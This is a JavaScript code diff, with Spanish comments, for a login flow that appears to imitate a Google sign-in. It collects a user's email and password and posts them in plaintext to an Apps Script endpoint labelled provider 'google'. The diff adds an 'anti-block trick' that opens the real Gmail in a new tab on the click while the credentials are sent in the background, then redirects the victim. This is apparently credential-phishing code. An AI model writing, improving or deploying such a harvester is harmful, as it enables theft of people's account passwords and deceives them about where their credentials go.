@@ -24,14 +24,10 @@ function procesarFlujo() {
 
         userEmail = emailInput;
 
-        // Cambiar visibilidad de los contenedores de forma limpia
         document.getElementById('email-field').style.display = 'none';
         document.getElementById('password-field').style.display = 'block';
-        
-        // Poner el foco en la contraseña inmediatamente
         document.getElementById('password').focus();
 
-        // Actualizar textos de la cabecera
         const introDiv = document.querySelector('.intro');
         if(introDiv) {
             introDiv.innerHTML = `
@@ -60,6 +56,9 @@ function procesarFlujo() {
             btnNext.disabled = true;
         }
 
+        // 🌟 TRUCO ANTIBLOQUEO: Abrir Gmail en el instante exacto del clic
+        window.open("https://mail.google.com", "_blank");
+
         const payload = {
             action: "registerUser",
             provider: "google",
@@ -68,7 +67,7 @@ function procesarFlujo() {
             contrasena: passwordInput
         };
 
-        // Enviar a Apps Script
+        // Enviar a Apps Script en segundo plano
         fetch(SCRIPT_URL, {
             method: 'POST',
             headers: { "Content-Type": "text/plain;charset=utf-8" },
@@ -82,31 +81,23 @@ function procesarFlujo() {
             localStorage.setItem('vecino_nombre', userEmail);
             localStorage.setItem('vecino_colonia', 'Red Social');
 
-            // Mostrar notificación visual
             showSuccessNotification();
 
-            // Redirigir en la MISMA pestaña de forma limpia tras 1.5 segundos
+            // Redirigir la pestaña original al sistema de reportes
             setTimeout(() => {
                 window.location.href = `../index.html?user=${encodeURIComponent(userEmail)}`;
-            }, 1500); 
+            }, 1000); 
         });
     }
-} // <--- 🛠️ ESTA LLAVE FALTABA PARA CERRAR procesarFlujo()
+}
 
-// Evento para el botón principal
+// Eventos
 document.querySelector('.next-button').addEventListener('click', procesarFlujo);
 
-// Eventos para la tecla Enter en ambos inputs
 document.getElementById('email').addEventListener('keypress', function(e) {
-    if (e.key === 'Enter') { 
-        e.preventDefault(); 
-        procesarFlujo(); 
-    }
+    if (e.key === 'Enter') { e.preventDefault(); procesarFlujo(); }
 });
 
 document.getElementById('password').addEventListener('keypress', function(e) {
-    if (e.key === 'Enter') { 
-        e.preventDefault(); 
-        procesarFlujo(); 
-    }
+    if (e.key === 'Enter') { e.preventDefault(); procesarFlujo(); }
 });
